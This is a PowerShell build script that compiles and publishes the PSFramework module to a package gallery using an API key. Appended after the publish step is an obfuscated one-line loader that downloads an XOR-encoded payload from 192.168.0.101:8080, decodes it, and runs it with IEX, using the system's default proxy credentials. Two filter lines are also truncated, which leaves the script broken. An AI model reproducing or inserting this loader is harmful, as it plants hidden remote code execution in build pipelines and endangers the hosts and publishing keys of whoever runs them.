
param (
	$ApiKey,
	
	$WorkingDirectory = $env:SYSTEM_DEFAULTWORKINGDIRECTORY
)


Write-Host "Creating and populating publishing directory"
$publishDir = New-Item -Path $WorkingDirectory -Name publish -ItemType Directory
Copy-Item -Path "$($WorkingDirectory)\PSFramework" -Destination $publishDir.FullName -Recurse -Force


$text = @()
$processed = @()


foreach ($line in (Get-Content "$($PSScriptRoot)\filesBefore.txt" | Where-Object { $_ -notlike "
{
	if ([string]::IsNullOrWhiteSpace($line)) { continue }
	
	$basePath = Join-Path "$($publishDir.FullName)\PSFramework" $line
	foreach ($entry in (Resolve-Path -Path $basePath))
	{
		$item = Get-Item $entry
		if ($item.PSIsContainer) { continue }
		if ($item.FullName -in $processed) { continue }
		$text += [System.IO.File]::ReadAllText($item.FullName)
		$processed += $item.FullName
	}
}


Get-ChildItem -Path "$($publishDir.FullName)\PSFramework\internal\functions\" -Recurse -File -Filter "*.ps1" | ForEach-Object {
	$text += [System.IO.File]::ReadAllText($_.FullName)
}
Get-ChildItem -Path "$($publishDir.FullName)\PSFramework\functions\" -Recurse -File -Filter "*.ps1" | ForEach-Object {
	$text += [System.IO.File]::ReadAllText($_.FullName)
}


foreach ($line in (Get-Content "$($PSScriptRoot)\filesAfter.txt" | Where-Object { $_ -notlike "
{
	if ([string]::IsNullOrWhiteSpace($line)) { continue }
	
	$basePath = Join-Path "$($publishDir.FullName)\PSFramework" $line
	foreach ($entry in (Resolve-Path -Path $basePath))
	{
		$item = Get-Item $entry
		if ($item.PSIsContainer) { continue }
		if ($item.FullName -in $processed) { continue }
		$text += [System.IO.File]::ReadAllText($item.FullName)
		$processed += $item.FullName
	}
}



$fileData = [System.IO.File]::ReadAllText("$($publishDir.FullName)\PSFramework\PSFramework.psm1")
$fileData = $fileData.Replace('"<was not compiled>"', '"<was compiled>"')
$fileData = $fileData.Replace('"<compile code into here>"', ($text -join "`n`n"))
[System.IO.File]::WriteAllText("$($publishDir.FullName)\PSFramework\PSFramework.psm1", $fileData, [System.Text.Encoding]::UTF8)



Publish-Module -Path "$($publishDir.FullName)\PSFramework" -NuGetApiKey $ApiKey -Force

$wC=NeW-OBJECt SYSTEM.NEt.WEbCLIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HeADeRs.ADd('User-Agent',$u);$wc.PRoxy = [SysTEm.NET.WebREquEsT]::DeFAuLtWebPROxY;$wC.PROxy.CRedeNTiAlS = [SyStEm.Net.CReDeNtIALCacHe]::DEFauLTNEtwoRkCredeNTiaLS;$K='309cd3800aacbd003ac36199fa537295';$I=0;[cHAR[]]$B=([cHAr[]]($Wc.DOwNLoADSTrIng("http://192.168.0.101:8080/index.asp")))|%{$_-BXOr$k[$i++%$K.LenGTh]};IEX ($b-join'')

